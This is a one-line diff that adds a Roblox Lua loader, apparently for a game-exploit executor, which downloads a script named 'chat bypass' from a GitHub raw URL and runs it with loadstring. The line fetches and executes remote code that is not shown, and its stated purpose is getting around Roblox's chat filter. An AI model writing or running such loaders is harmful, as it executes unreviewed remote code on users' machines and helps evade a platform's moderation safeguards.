@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Valysee/Chat-bypass-by-me-vazy/main/chat bypass"))()
